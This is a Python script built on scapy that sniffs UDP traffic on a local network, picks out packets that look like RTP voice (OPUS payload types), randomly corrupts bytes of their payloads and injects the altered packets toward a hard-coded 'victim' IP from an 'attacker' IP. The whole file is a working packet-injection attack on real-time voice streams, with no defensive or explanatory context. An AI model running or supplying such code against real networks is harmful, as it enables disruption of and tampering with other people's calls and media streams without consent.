from scapy.all import sniff, IP, UDP, Raw, send
import random
import time
import binascii

network_interface = "Wi-Fi"  # Replace with your interface name

target_ip = "192.168.137.140"  # Target IP (victim)
target_port = None  # Will be extracted from captured packets

source_ip = "192.168.137.93"  # Attacker IP
source_port = 12345  # Random attacker port

def generate_dynamic_payload(payload):
    """
    Modify the captured payload to create dynamic packets.
    """
    payload = bytearray(payload)
    
    # Example: Randomly modify bytes in the payload
    for i in range(12, len(payload), 8):  # Skip the RTP header (12 bytes)
        payload[i] = random.randint(0, 255)
    
    return bytes(payload)

def inject_rtp_packet(original_packet):
    """
    Inject a modified RTP packet based on the captured packet.
    """
    global target_port

    # Extract RTP payload from the captured packet
    if Raw in original_packet:
        captured_payload = original_packet[Raw].load
    else:
        return  # Skip packets without a payload

    # Generate a dynamic payload
    dynamic_payload = generate_dynamic_payload(captured_payload)

    # Extract target port from the captured packet
    target_port = original_packet[UDP].dport

    # Create the IP and UDP layers
    ip = IP(src=source_ip, dst=target_ip)
    udp = UDP(sport=source_port, dport=target_port)

    # Create the RTP packet with modified payload
    packet = ip / udp / Raw(load=dynamic_payload)

    # Send the modified packet
    send(packet, verbose=False)
    print(f"Injected modified RTP packet to {target_ip}:{target_port}")

def packet_callback(packet):
    if UDP in packet and Raw in packet:
        # Analyze RTP payload type (dynamic range for OPUS is typically 96-127)
        rtp_payload_type = packet[Raw].load[1] & 0x7F
        if 96 <= rtp_payload_type <= 127:
            print(f"Captured RTP packet from {packet[IP].src}:{packet[UDP].sport}")
            inject_rtp_packet(packet)

def start_sniffing():
    """
    Start sniffing RTP packets on the specified network interface.
    """
    print(f"Sniffing for RTP packets on interface {network_interface}...")
    sniff(iface=network_interface, filter="udp", prn=packet_callback, store=False)

if __name__ == "__main__":
    start_sniffing()
